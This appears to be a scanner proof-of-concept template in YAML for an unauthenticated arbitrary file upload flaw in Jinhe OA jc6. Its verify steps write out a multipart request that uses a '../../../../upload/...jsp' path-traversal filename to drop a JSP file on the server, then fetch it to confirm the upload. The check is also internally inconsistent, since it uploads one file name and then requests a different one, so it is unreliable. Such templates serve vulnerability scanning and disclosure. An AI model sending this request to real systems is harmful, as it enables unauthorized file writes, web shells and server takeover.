app: 金和OA
query: app:"金合OA"
meta:
    name: 金和OA jc6 ntko-upload 任意文件上传漏洞复现
    level: 4
    tags:
        - file_upload
    description: ' 金和OA jc6系统/jc6/ntkoUpload/接口处存在任意文件上传漏洞，未经身份认证的攻击者可利用此漏洞上传恶意后门文件，最终可导致服务器失陷。 '
    homepage: http://www.jinher.com/Zproducts/index/id/391
    author: X prism
    references: ""
    solution: 安装补丁
    create_at: "2024-01-05 16:37:37"
    available: false
    steps:
        variable: []
        verify_steps:
            type: and
            verify:
                - request:
                    method: POST
                    path: /jc6/ntkoUpload/ntko-upload!upload.action
                    redirect: true
                    header:
                        - ' Content-Type': multipart/form-data; boundary=----8g6ns8xzdkn2o9vycz2y
                    params: |4-
                                ------8g6ns8xzdkn2o9vycz2y

                                Content-Disposition: form-data; name="filename"


                                ../../../../upload/44cyigehu.jsp

                                ------8g6ns8xzdkn2o9vycz2y

                                Content-Disposition: form-data; name="upLoadFile";
                                filename="44cyigehu.jpg"

                                Content-Type: image/jpeg


                                1

                                ------8g6ns8xzdkn2o9vycz2y

                                Content-Disposition: form-data; name="Submit"


                                upload

                                ------8g6ns8xzdkn2o9vycz2y--
                  response:
                    - name: code
                      value: "200"
                      type: equals
                - request:
                    method: POST
                    path: /upload/qax.jsp
                    redirect: false
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                    - name: body
                      value: "1"
                      type: contains
        exploit_steps:
            type: ""
            params:
                name: ""
                type: input
                value: ""
